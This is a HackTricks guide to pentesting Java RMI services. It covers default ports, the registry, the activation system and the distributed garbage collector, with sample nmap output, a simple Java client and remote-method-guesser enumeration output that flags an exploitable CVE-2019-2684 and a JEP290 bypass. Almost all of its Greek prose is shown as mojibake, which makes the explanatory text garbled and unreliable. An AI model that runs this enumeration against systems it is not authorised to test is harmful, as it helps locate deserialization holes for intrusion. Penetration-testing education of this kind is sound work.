# 1098/1099/1050 - Pentesting Java RMI - RMI-IIOP

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Use [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=1099-pentesting-java-rmi) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
Get Access Today:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=1099-pentesting-java-rmi" %}

## Basic Information

_Java Remote Method Invocation_, or _Java RMI_, ÎµÎ¯Î½Î±Î¹ Î­Î½Î±Ï‚ Î±Î½Ï„Î¹ÎºÎµÎ¹Î¼ÎµÎ½Î¿ÏƒÏ„ÏÎ±Ï†Î®Ï‚ Î¼Î·Ï‡Î±Î½Î¹ÏƒÎ¼ÏŒÏ‚ _RPC_ Ï€Î¿Ï… ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ ÏƒÎµ Î­Î½Î± Î±Î½Ï„Î¹ÎºÎµÎ¯Î¼ÎµÎ½Î¿ Ï€Î¿Ï… Î²ÏÎ¯ÏƒÎºÎµÏ„Î±Î¹ ÏƒÎµ Î¼Î¹Î± _Java virtual machine_ Î½Î± ÎºÎ±Î»ÎµÎ¯ Î¼ÎµÎ¸ÏŒÎ´Î¿Ï…Ï‚ ÏƒÎµ Î­Î½Î± Î±Î½Ï„Î¹ÎºÎµÎ¯Î¼ÎµÎ½Î¿ Ï€Î¿Ï… Î²ÏÎ¯ÏƒÎºÎµÏ„Î±Î¹ ÏƒÎµ Î¬Î»Î»Î· _Java virtual machine_. Î‘Ï…Ï„ÏŒ ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ ÏƒÏ„Î¿Ï…Ï‚ Ï€ÏÎ¿Î³ÏÎ±Î¼Î¼Î±Ï„Î¹ÏƒÏ„Î­Ï‚ Î½Î± Î³ÏÎ¬Ï†Î¿Ï…Î½ ÎºÎ±Ï„Î±Î½ÎµÎ¼Î·Î¼Î­Î½ÎµÏ‚ ÎµÏ†Î±ÏÎ¼Î¿Î³Î­Ï‚ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Î¼Î¹Î± Î±Î½Ï„Î¹ÎºÎµÎ¹Î¼ÎµÎ½Î¿ÏƒÏ„ÏÎ±Ï†Î® Ï€Î±ÏÎ± paradigma. ÎœÎ¹Î± ÏƒÏÎ½Ï„Î¿Î¼Î· ÎµÎ¹ÏƒÎ±Î³Ï‰Î³Î® ÏƒÏ„Î¿ _Java RMI_ Î±Ï€ÏŒ ÎµÏ€Î¹Î¸ÎµÏ„Î¹ÎºÎ® Ï€ÏÎ¿Î¿Ï€Ï„Î¹ÎºÎ® Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î²ÏÎµÎ¸ÎµÎ¯ ÏƒÎµ [Î±Ï…Ï„Î® Ï„Î·Î½ Î¿Î¼Î¹Î»Î¯Î± blackhat](https://youtu.be/t\_aw1mDNhzI?t=202).

**Default port:** 1090,1098,1099,1199,4443-4446,8999-9010,9999
```
PORT      STATE SERVICE      VERSION
1090/tcp  open  ssl/java-rmi Java RMI
9010/tcp  open  java-rmi     Java RMI
37471/tcp open  java-rmi     Java RMI
40259/tcp open  ssl/java-rmi Java RMI
```
Î£Ï…Î½Î®Î¸Ï‰Ï‚, Î¼ÏŒÎ½Î¿ Ï„Î± Ï€ÏÎ¿ÎµÏ€Î¹Î»ÎµÎ³Î¼Î­Î½Î± _Java RMI_ ÏƒÏ…ÏƒÏ„Î±Ï„Î¹ÎºÎ¬ (Ï„Î¿ _RMI Registry_ ÎºÎ±Î¹ Ï„Î¿ _Activation System_) ÎµÎ¯Î½Î±Î¹ Î´ÎµÏƒÎ¼ÎµÏ…Î¼Î­Î½Î± ÏƒÎµ ÎºÎ¿Î¹Î½Î­Ï‚ Î¸ÏÏÎµÏ‚. Î¤Î± _remote objects_ Ï€Î¿Ï… Ï…Î»Î¿Ï€Î¿Î¹Î¿ÏÎ½ Ï„Î·Î½ Ï€ÏÎ±Î³Î¼Î±Ï„Î¹ÎºÎ® _RMI_ ÎµÏ†Î±ÏÎ¼Î¿Î³Î® ÎµÎ¯Î½Î±Î¹ ÏƒÏ…Î½Î®Î¸Ï‰Ï‚ Î´ÎµÏƒÎ¼ÎµÏ…Î¼Î­Î½Î± ÏƒÎµ Ï„Ï…Ï‡Î±Î¯ÎµÏ‚ Î¸ÏÏÎµÏ‚ ÏŒÏ€Ï‰Ï‚ Ï†Î±Î¯Î½ÎµÏ„Î±Î¹ ÏƒÏ„Î·Î½ Î­Î¾Î¿Î´Î¿ Ï€Î±ÏÎ±Ï€Î¬Î½Ï‰.

Î¤Î¿ _nmap_ Î­Ï‡ÎµÎ¹ Î¼ÎµÏÎ¹ÎºÎ­Ï‚ Ï†Î¿ÏÎ­Ï‚ Ï€ÏÎ¿Î²Î»Î®Î¼Î±Ï„Î± ÏƒÏ„Î·Î½ Î±Î½Î±Î³Î½ÏÏÎ¹ÏƒÎ· _SSL_ Ï€ÏÎ¿ÏƒÏ„Î±Ï„ÎµÏ…Î¼Î­Î½Ï‰Î½ _RMI_ Ï…Ï€Î·ÏÎµÏƒÎ¹ÏÎ½. Î•Î¬Î½ ÏƒÏ…Î½Î±Î½Ï„Î®ÏƒÎµÏ„Îµ Î¼Î¹Î± Î¬Î³Î½Ï‰ÏƒÏ„Î· ssl Ï…Ï€Î·ÏÎµÏƒÎ¯Î± ÏƒÎµ Î¼Î¹Î± ÎºÎ¿Î¹Î½Î® _RMI_ Î¸ÏÏÎ±, Î¸Î± Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± ÎµÏÎµÏ…Î½Î®ÏƒÎµÏ„Îµ Ï€ÎµÏÎ±Î¹Ï„Î­ÏÏ‰.

## RMI Components

Î“Î¹Î± Î½Î± Ï„Î¿ Î¸Î­ÏƒÎ¿Ï…Î¼Îµ Î±Ï€Î»Î¬, Ï„Î¿ _Java RMI_ ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ ÏƒÎµ Î­Î½Î±Î½ Ï€ÏÎ¿Î³ÏÎ±Î¼Î¼Î±Ï„Î¹ÏƒÏ„Î® Î½Î± ÎºÎ¬Î½ÎµÎ¹ Î­Î½Î± _Java object_ Î´Î¹Î±Î¸Î­ÏƒÎ¹Î¼Î¿ ÏƒÏ„Î¿ Î´Î¯ÎºÏ„Ï…Î¿. Î‘Ï…Ï„ÏŒ Î±Î½Î¿Î¯Î³ÎµÎ¹ Î¼Î¹Î± _TCP_ Î¸ÏÏÎ± ÏŒÏ€Î¿Ï… Î¿Î¹ Ï€ÎµÎ»Î¬Ï„ÎµÏ‚ Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± ÏƒÏ…Î½Î´ÎµÎ¸Î¿ÏÎ½ ÎºÎ±Î¹ Î½Î± ÎºÎ±Î»Î­ÏƒÎ¿Ï…Î½ Î¼ÎµÎ¸ÏŒÎ´Î¿Ï…Ï‚ ÏƒÏ„Î¿ Î±Î½Ï„Î¯ÏƒÏ„Î¿Î¹Ï‡Î¿ Î±Î½Ï„Î¹ÎºÎµÎ¯Î¼ÎµÎ½Î¿. Î Î±ÏÎ¬ Ï„Î¿ Î³ÎµÎ³Î¿Î½ÏŒÏ‚ ÏŒÏ„Î¹ Î±Ï…Ï„ÏŒ Î±ÎºÎ¿ÏÎ³ÎµÏ„Î±Î¹ Î±Ï€Î»ÏŒ, Ï…Ï€Î¬ÏÏ‡Î¿Ï…Î½ Î±ÏÎºÎµÏ„Î­Ï‚ Ï€ÏÎ¿ÎºÎ»Î®ÏƒÎµÎ¹Ï‚ Ï€Î¿Ï… Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± ÎµÏ€Î¹Î»ÏÏƒÎµÎ¹ Ï„Î¿ _Java RMI_:

1. Î“Î¹Î± Î½Î± Î±Ï€Î¿ÏƒÏ„ÎµÎ¯Î»Î¿Ï…Î½ Î¼Î¹Î± ÎºÎ»Î®ÏƒÎ· Î¼ÎµÎ¸ÏŒÎ´Î¿Ï… Î¼Î­ÏƒÏ‰ _Java RMI_, Î¿Î¹ Ï€ÎµÎ»Î¬Ï„ÎµÏ‚ Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± Î³Î½Ï‰ÏÎ¯Î¶Î¿Ï…Î½ Ï„Î· Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ· IP, Ï„Î· Î¸ÏÏÎ± Î±ÎºÏÏŒÎ±ÏƒÎ·Ï‚, Ï„Î·Î½ Ï…Î»Î¿Ï€Î¿Î¹Î·Î¼Î­Î½Î· ÎºÎ»Î¬ÏƒÎ· Î® Î´Î¹ÎµÏ€Î±Ï†Î® ÎºÎ±Î¹ Ï„Î¿ `ObjID` Ï„Î¿Ï… ÏƒÏ„Î¿Ï‡ÎµÏ…Î¼Î­Î½Î¿Ï… Î±Î½Ï„Î¹ÎºÎµÎ¹Î¼Î­Î½Î¿Ï… (Ï„Î¿ `ObjID` ÎµÎ¯Î½Î±Î¹ Î­Î½Î±Ï‚ Î¼Î¿Î½Î±Î´Î¹ÎºÏŒÏ‚ ÎºÎ±Î¹ Ï„Ï…Ï‡Î±Î¯Î¿Ï‚ Î±Î½Î±Î³Î½Ï‰ÏÎ¹ÏƒÏ„Î®Ï‚ Ï€Î¿Ï… Î´Î·Î¼Î¹Î¿Ï…ÏÎ³ÎµÎ¯Ï„Î±Î¹ ÏŒÏ„Î±Î½ Ï„Î¿ Î±Î½Ï„Î¹ÎºÎµÎ¯Î¼ÎµÎ½Î¿ ÎºÎ±Î¸Î¯ÏƒÏ„Î±Ï„Î±Î¹ Î´Î¹Î±Î¸Î­ÏƒÎ¹Î¼Î¿ ÏƒÏ„Î¿ Î´Î¯ÎºÏ„Ï…Î¿. Î•Î¯Î½Î±Î¹ Î±Ï€Î±ÏÎ±Î¯Ï„Î·Ï„Î¿ ÎµÏ€ÎµÎ¹Î´Î® Ï„Î¿ _Java RMI_ ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ ÏƒÎµ Ï€Î¿Î»Î»Î±Ï€Î»Î¬ Î±Î½Ï„Î¹ÎºÎµÎ¯Î¼ÎµÎ½Î± Î½Î± Î±ÎºÎ¿ÏÎ½ ÏƒÏ„Î·Î½ Î¯Î´Î¹Î± _TCP_ Î¸ÏÏÎ±).
2. ÎŸÎ¹ Î±Ï€Î¿Î¼Î±ÎºÏÏ…ÏƒÎ¼Î­Î½Î¿Î¹ Ï€ÎµÎ»Î¬Ï„ÎµÏ‚ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î´ÎµÏƒÎ¼ÎµÏÏƒÎ¿Ï…Î½ Ï€ÏŒÏÎ¿Ï…Ï‚ ÏƒÏ„Î¿Î½ Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î® ÎºÎ±Î»ÏÎ½Ï„Î±Ï‚ Î¼ÎµÎ¸ÏŒÎ´Î¿Ï…Ï‚ ÏƒÏ„Î¿ ÎµÎºÏ„ÎµÎ¸ÎµÎ¹Î¼Î­Î½Î¿ Î±Î½Ï„Î¹ÎºÎµÎ¯Î¼ÎµÎ½Î¿. Î— _Java virtual machine_ Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± Ï€Î±ÏÎ±ÎºÎ¿Î»Î¿Ï…Î¸ÎµÎ¯ Ï€Î¿Î¹Î¿Î¹ Î±Ï€ÏŒ Î±Ï…Ï„Î¿ÏÏ‚ Ï„Î¿Ï…Ï‚ Ï€ÏŒÏÎ¿Ï…Ï‚ ÎµÎ¯Î½Î±Î¹ Î±ÎºÏŒÎ¼Î± ÏƒÎµ Ï‡ÏÎ®ÏƒÎ· ÎºÎ±Î¹ Ï€Î¿Î¹Î¿Î¹ Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± ÏƒÏ…Î»Î»ÎµÏ‡Î¸Î¿ÏÎ½ Ï‰Ï‚ ÏƒÎºÎ¿Ï…Ï€Î¯Î´Î¹Î±.

Î— Ï€ÏÏÏ„Î· Ï€ÏÏŒÎºÎ»Î·ÏƒÎ· ÎµÏ€Î¹Î»ÏÎµÏ„Î±Î¹ Î±Ï€ÏŒ Ï„Î¿ _RMI registry_, Ï„Î¿ Î¿Ï€Î¿Î¯Î¿ ÎµÎ¯Î½Î±Î¹ Î²Î±ÏƒÎ¹ÎºÎ¬ Î¼Î¹Î± Ï…Ï€Î·ÏÎµÏƒÎ¯Î± Î¿Î½Î¿Î¼Î±Ï„Î¿Î´Î¿ÏƒÎ¯Î±Ï‚ Î³Î¹Î± Ï„Î¿ _Java RMI_. Î¤Î¿ _RMI registry_ ÎµÎ¯Î½Î±Î¹ ÎµÏ€Î¯ÏƒÎ·Ï‚ Î¼Î¹Î± _RMI service_, Î±Î»Î»Î¬ Î· Ï…Î»Î¿Ï€Î¿Î¹Î·Î¼Î­Î½Î· Î´Î¹ÎµÏ€Î±Ï†Î® ÎºÎ±Î¹ Ï„Î¿ `ObjID` ÎµÎ¯Î½Î±Î¹ ÏƒÏ„Î±Î¸ÎµÏÎ¬ ÎºÎ±Î¹ Î³Î½Ï‰ÏƒÏ„Î¬ ÏƒÎµ ÏŒÎ»Î¿Ï…Ï‚ Ï„Î¿Ï…Ï‚ _RMI_ Ï€ÎµÎ»Î¬Ï„ÎµÏ‚. Î‘Ï…Ï„ÏŒ ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ ÏƒÏ„Î¿Ï…Ï‚ _RMI_ Ï€ÎµÎ»Î¬Ï„ÎµÏ‚ Î½Î± ÎºÎ±Ï„Î±Î½Î±Î»ÏÎ½Î¿Ï…Î½ Ï„Î¿ _RMI_ registry Î±Ï€Î»Î¬ Î³Î½Ï‰ÏÎ¯Î¶Î¿Î½Ï„Î±Ï‚ Ï„Î·Î½ Î±Î½Ï„Î¯ÏƒÏ„Î¿Î¹Ï‡Î· _TCP_ Î¸ÏÏÎ±.

ÎŒÏ„Î±Î½ Î¿Î¹ Ï€ÏÎ¿Î³ÏÎ±Î¼Î¼Î±Ï„Î¹ÏƒÏ„Î­Ï‚ Î¸Î­Î»Î¿Ï…Î½ Î½Î± ÎºÎ¬Î½Î¿Ï…Î½ Ï„Î± _Java objects_ Ï„Î¿Ï…Ï‚ Î´Î¹Î±Î¸Î­ÏƒÎ¹Î¼Î± ÏƒÏ„Î¿ Î´Î¯ÎºÏ„Ï…Î¿, ÏƒÏ…Î½Î®Î¸Ï‰Ï‚ Ï„Î± Î´ÎµÏƒÎ¼ÎµÏÎ¿Ï…Î½ ÏƒÎµ Î­Î½Î± _RMI registry_. Î¤Î¿ _registry_ Î±Ï€Î¿Î¸Î·ÎºÎµÏÎµÎ¹ ÏŒÎ»ÎµÏ‚ Ï„Î¹Ï‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ Ï€Î¿Ï… Î±Ï€Î±Î¹Ï„Î¿ÏÎ½Ï„Î±Î¹ Î³Î¹Î± Î½Î± ÏƒÏ…Î½Î´ÎµÎ¸ÎµÎ¯ ÎºÎ±Î½ÎµÎ¯Ï‚ Î¼Îµ Ï„Î¿ Î±Î½Ï„Î¹ÎºÎµÎ¯Î¼ÎµÎ½Î¿ (Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ· IP, Î¸ÏÏÎ± Î±ÎºÏÏŒÎ±ÏƒÎ·Ï‚, Ï…Î»Î¿Ï€Î¿Î¹Î·Î¼Î­Î½Î· ÎºÎ»Î¬ÏƒÎ· Î® Î´Î¹ÎµÏ€Î±Ï†Î® ÎºÎ±Î¹ Ï„Î·Î½ Ï„Î¹Î¼Î® `ObjID`) ÎºÎ±Î¹ Ï„Î¹Ï‚ ÎºÎ±Î¸Î¹ÏƒÏ„Î¬ Î´Î¹Î±Î¸Î­ÏƒÎ¹Î¼ÎµÏ‚ Ï…Ï€ÏŒ Î­Î½Î± Î±Î½Î¸ÏÏÏ€Î¹Î½Î± Î±Î½Î±Î³Î½ÏÏƒÎ¹Î¼Î¿ ÏŒÎ½Î¿Î¼Î± (Ï„Î¿ _bound name_). ÎŸÎ¹ Ï€ÎµÎ»Î¬Ï„ÎµÏ‚ Ï€Î¿Ï… Î¸Î­Î»Î¿Ï…Î½ Î½Î± ÎºÎ±Ï„Î±Î½Î±Î»ÏÏƒÎ¿Ï…Î½ Ï„Î·Î½ _RMI service_ Î¶Î·Ï„Î¿ÏÎ½ Î±Ï€ÏŒ Ï„Î¿ _RMI registry_ Ï„Î¿ Î±Î½Ï„Î¯ÏƒÏ„Î¿Î¹Ï‡Î¿ _bound name_ ÎºÎ±Î¹ Ï„Î¿ registry ÎµÏ€Î¹ÏƒÏ„ÏÎ­Ï†ÎµÎ¹ ÏŒÎ»ÎµÏ‚ Ï„Î¹Ï‚ Î±Ï€Î±Î¹Ï„Î¿ÏÎ¼ÎµÎ½ÎµÏ‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ Î³Î¹Î± Ï„Î· ÏƒÏÎ½Î´ÎµÏƒÎ·. ÎˆÏ„ÏƒÎ¹, Î· ÎºÎ±Ï„Î¬ÏƒÏ„Î±ÏƒÎ· ÎµÎ¯Î½Î±Î¹ Î²Î±ÏƒÎ¹ÎºÎ¬ Î· Î¯Î´Î¹Î± Î¼Îµ Î¼Î¹Î± ÏƒÏ…Î½Î·Î¸Î¹ÏƒÎ¼Î­Î½Î· _DNS_ Ï…Ï€Î·ÏÎµÏƒÎ¯Î±. Î— Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰ ÎºÎ±Ï„Î±Ï‡ÏÏÎ·ÏƒÎ· Î´ÎµÎ¯Ï‡Î½ÎµÎ¹ Î­Î½Î± Î¼Î¹ÎºÏÏŒ Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î±:
```java
import java.rmi.registry.Registry;
import java.rmi.registry.LocateRegistry;
import lab.example.rmi.interfaces.RemoteService;

public class ExampleClient {

private static final String remoteHost = "172.17.0.2";
private static final String boundName = "remote-service";

public static void main(String[] args)
{
try {
Registry registry = LocateRegistry.getRegistry(remoteHost);     // Connect to the RMI registry
RemoteService ref = (RemoteService)registry.lookup(boundName);  // Lookup the desired bound name
String response = ref.remoteMethod();                           // Call a remote method

} catch( Exception e) {
e.printStackTrace();
}
}
}
```
Î— Î´ÎµÏÏ„ÎµÏÎ· Î±Ï€ÏŒ Ï„Î¹Ï‚ Ï€Î±ÏÎ±Ï€Î¬Î½Ï‰ Ï€ÏÎ¿ÎºÎ»Î®ÏƒÎµÎ¹Ï‚ ÎµÏ€Î¹Î»ÏÎµÏ„Î±Î¹ Î±Ï€ÏŒ Ï„Î¿Î½ _Distributed Garbage Collector_ (_DGC_). Î‘Ï…Ï„Î® ÎµÎ¯Î½Î±Î¹ Î¼Î¹Î± Î¬Î»Î»Î· _RMI service_ Î¼Îµ Î¼Î¹Î± Î³Î½Ï‰ÏƒÏ„Î® Ï„Î¹Î¼Î® `ObjID` ÎºÎ±Î¹ ÎµÎ¯Î½Î±Î¹ Î´Î¹Î±Î¸Î­ÏƒÎ¹Î¼Î· ÏƒÎµ Î²Î±ÏƒÎ¹ÎºÎ¬ ÎºÎ¬Î¸Îµ _RMI endpoint_. ÎŒÏ„Î±Î½ Î­Î½Î±Ï‚ _RMI client_ Î±ÏÏ‡Î¯Î¶ÎµÎ¹ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯ Î¼Î¹Î± _RMI service_, ÏƒÏ„Î­Î»Î½ÎµÎ¹ Î¼Î¹Î± Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯Î± ÏƒÏ„Î¿Î½ _DGC_ ÏŒÏ„Î¹ Ï„Î¿ Î±Î½Ï„Î¯ÏƒÏ„Î¿Î¹Ï‡Î¿ _remote object_ ÎµÎ¯Î½Î±Î¹ ÏƒÎµ Ï‡ÏÎ®ÏƒÎ·. ÎŸ _DGC_ Î¼Ï€Î¿ÏÎµÎ¯ ÏƒÏ„Î· ÏƒÏ…Î½Î­Ï‡ÎµÎ¹Î± Î½Î± Ï€Î±ÏÎ±ÎºÎ¿Î»Î¿Ï…Î¸ÎµÎ¯ Ï„Î¿Î½ Î±ÏÎ¹Î¸Î¼ÏŒ Î±Î½Î±Ï†Î¿ÏÏÎ½ ÎºÎ±Î¹ ÎµÎ¯Î½Î±Î¹ ÏƒÎµ Î¸Î­ÏƒÎ· Î½Î± ÎºÎ±Î¸Î±ÏÎ¯Î¶ÎµÎ¹ Ï„Î± Î¼Î· Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î¿ÏÎ¼ÎµÎ½Î± Î±Î½Ï„Î¹ÎºÎµÎ¯Î¼ÎµÎ½Î±.

ÎœÎ±Î¶Î¯ Î¼Îµ Ï„Î¿ Î±Ï€Î¿ÏƒÏ…ÏÎ¸Î­Î½ _Activation System_, Î±Ï…Ï„Î¬ ÎµÎ¯Î½Î±Î¹ Ï„Î± Ï„ÏÎ¯Î± Ï€ÏÎ¿ÎµÏ€Î¹Î»ÎµÎ³Î¼Î­Î½Î± ÏƒÏ…ÏƒÏ„Î±Ï„Î¹ÎºÎ¬ Ï„Î¿Ï… _Java RMI_:

1. ÎŸ _RMI Registry_ (`ObjID = 0`)
2. Î¤Î¿ _Activation System_ (`ObjID = 1`)
3. ÎŸ _Distributed Garbage Collector_ (`ObjID = 2`)

Î¤Î± Ï€ÏÎ¿ÎµÏ€Î¹Î»ÎµÎ³Î¼Î­Î½Î± ÏƒÏ…ÏƒÏ„Î±Ï„Î¹ÎºÎ¬ Ï„Î¿Ï… _Java RMI_ ÎµÎ¯Î½Î±Î¹ Î³Î½Ï‰ÏƒÏ„Î¬ ÎµÏ€Î¹Î¸ÎµÏ„Î¹ÎºÎ¬ ÏƒÎ·Î¼ÎµÎ¯Î± ÎµÎ´Ï ÎºÎ±Î¹ Î±ÏÎºÎµÏ„ÏŒ ÎºÎ±Î¹ÏÏŒ ÎºÎ±Î¹ Ï…Ï€Î¬ÏÏ‡Î¿Ï…Î½ Ï€Î¿Î»Î»Î­Ï‚ ÎµÏ…Ï€Î¬Î¸ÎµÎ¹ÎµÏ‚ ÏƒÎµ Ï€Î±Î»Î¹Î­Ï‚ ÎµÎºÎ´ÏŒÏƒÎµÎ¹Ï‚ Ï„Î¿Ï… _Java_. Î‘Ï€ÏŒ Ï„Î·Î½ Î¿Ï€Ï„Î¹ÎºÎ® Î³Ï‰Î½Î¯Î± ÎµÎ½ÏŒÏ‚ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï…, Î±Ï…Ï„Î¬ Ï„Î± Ï€ÏÎ¿ÎµÏ€Î¹Î»ÎµÎ³Î¼Î­Î½Î± ÏƒÏ…ÏƒÏ„Î±Ï„Î¹ÎºÎ¬ ÎµÎ¯Î½Î±Î¹ ÎµÎ½Î´Î¹Î±Ï†Î­ÏÎ¿Î½Ï„Î±, ÎµÏ€ÎµÎ¹Î´Î® Ï…Î»Î¿Ï€Î¿Î¹Î¿ÏÎ½ Î³Î½Ï‰ÏƒÏ„Î­Ï‚ ÎºÎ»Î¬ÏƒÎµÎ¹Ï‚ / Î´Î¹ÎµÏ€Î±Ï†Î­Ï‚ ÎºÎ±Î¹ ÎµÎ¯Î½Î±Î¹ ÎµÏÎºÎ¿Î»Î¿ Î½Î± Î±Î»Î»Î·Î»ÎµÏ€Î¹Î´ÏÎ¬ÏƒÎµÏ„Îµ Î¼Î±Î¶Î¯ Ï„Î¿Ï…Ï‚. Î‘Ï…Ï„Î® Î· ÎºÎ±Ï„Î¬ÏƒÏ„Î±ÏƒÎ· ÎµÎ¯Î½Î±Î¹ Î´Î¹Î±Ï†Î¿ÏÎµÏ„Î¹ÎºÎ® Î³Î¹Î± Ï„Î¹Ï‚ Ï€ÏÎ¿ÏƒÎ±ÏÎ¼Î¿ÏƒÎ¼Î­Î½ÎµÏ‚ _RMI services_. Î“Î¹Î± Î½Î± ÎºÎ±Î»Î­ÏƒÎµÏ„Îµ Î¼Î¹Î± Î¼Î­Î¸Î¿Î´Î¿ ÏƒÎµ Î­Î½Î± _remote object_, Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± Î³Î½Ï‰ÏÎ¯Î¶ÎµÏ„Îµ Ï„Î·Î½ Î±Î½Ï„Î¯ÏƒÏ„Î¿Î¹Ï‡Î· Ï…Ï€Î¿Î³ÏÎ±Ï†Î® Î¼ÎµÎ¸ÏŒÎ´Î¿Ï… ÎµÎº Ï„Ï‰Î½ Ï€ÏÎ¿Ï„Î­ÏÏ‰Î½. Î§Ï‰ÏÎ¯Ï‚ Î½Î± Î³Î½Ï‰ÏÎ¯Î¶ÎµÏ„Îµ Î¼Î¹Î± Ï…Ï€Î¬ÏÏ‡Î¿Ï…ÏƒÎ± Ï…Ï€Î¿Î³ÏÎ±Ï†Î® Î¼ÎµÎ¸ÏŒÎ´Î¿Ï…, Î´ÎµÎ½ Ï…Ï€Î¬ÏÏ‡ÎµÎ¹ Ï„ÏÏŒÏ€Î¿Ï‚ Î½Î± ÎµÏ€Î¹ÎºÎ¿Î¹Î½Ï‰Î½Î®ÏƒÎµÏ„Îµ Î¼Îµ Î¼Î¹Î± _RMI service_.

## RMI Enumeration

[remote-method-guesser](https://github.com/qtc-de/remote-method-guesser) ÎµÎ¯Î½Î±Î¹ Î­Î½Î±Ï‚ ÏƒÎ±ÏÏ‰Ï„Î®Ï‚ ÎµÏ…Ï€Î±Î¸ÎµÎ¹ÏÎ½ _Java RMI_ Ï€Î¿Ï… ÎµÎ¯Î½Î±Î¹ Î¹ÎºÎ±Î½ÏŒÏ‚ Î½Î± ÎµÎ½Ï„Î¿Ï€Î¯Î¶ÎµÎ¹ Î±Ï…Ï„ÏŒÎ¼Î±Ï„Î± ÎºÎ¿Î¹Î½Î­Ï‚ _RMI vulnerabilities_. ÎŒÏ€Î¿Ï„Îµ ÎµÎ½Ï„Î¿Ï€Î¯Î¶ÎµÏ„Îµ Î­Î½Î± _RMI_ endpoint, Î¸Î± Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± Ï„Î¿ Î´Î¿ÎºÎ¹Î¼Î¬ÏƒÎµÏ„Îµ:
```
$ rmg enum 172.17.0.2 9010
[+] RMI registry bound names:
[+]
[+] 	- plain-server2
[+] 		--> de.qtc.rmg.server.interfaces.IPlainServer (unknown class)
[+] 		    Endpoint: iinsecure.dev:37471  TLS: no  ObjID: [55ff5a5d:17e0501b054:-7ff7, 3638117546492248534]
[+] 	- legacy-service
[+] 		--> de.qtc.rmg.server.legacy.LegacyServiceImpl_Stub (unknown class)
[+] 		    Endpoint: iinsecure.dev:37471  TLS: no  ObjID: [55ff5a5d:17e0501b054:-7ffc, 708796783031663206]
[+] 	- plain-server
[+] 		--> de.qtc.rmg.server.interfaces.IPlainServer (unknown class)
[+] 		    Endpoint: iinsecure.dev:37471  TLS: no  ObjID: [55ff5a5d:17e0501b054:-7ff8, -4004948013687638236]
[+]
[+] RMI server codebase enumeration:
[+]
[+] 	- http://iinsecure.dev/well-hidden-development-folder/
[+] 		--> de.qtc.rmg.server.legacy.LegacyServiceImpl_Stub
[+] 		--> de.qtc.rmg.server.interfaces.IPlainServer
[+]
[+] RMI server String unmarshalling enumeration:
[+]
[+] 	- Caught ClassNotFoundException during lookup call.
[+] 	  --> The type java.lang.String is unmarshalled via readObject().
[+] 	  Configuration Status: Outdated
[+]
[+] RMI server useCodebaseOnly enumeration:
[+]
[+] 	- Caught MalformedURLException during lookup call.
[+] 	  --> The server attempted to parse the provided codebase (useCodebaseOnly=false).
[+] 	  Configuration Status: Non Default
[+]
[+] RMI registry localhost bypass enumeration (CVE-2019-2684):
[+]
[+] 	- Caught NotBoundException during unbind call (unbind was accepeted).
[+] 	  Vulnerability Status: Vulnerable
[+]
[+] RMI Security Manager enumeration:
[+]
[+] 	- Security Manager rejected access to the class loader.
[+] 	  --> The server does use a Security Manager.
[+] 	  Configuration Status: Current Default
[+]
[+] RMI server JEP290 enumeration:
[+]
[+] 	- DGC rejected deserialization of java.util.HashMap (JEP290 is installed).
[+] 	  Vulnerability Status: Non Vulnerable
[+]
[+] RMI registry JEP290 bypass enmeration:
[+]
[+] 	- Caught IllegalArgumentException after sending An Trinh gadget.
[+] 	  Vulnerability Status: Vulnerable
[+]
[+] RMI ActivationSystem enumeration:
[+]
[+] 	- Caught IllegalArgumentException during activate call (activator is present).
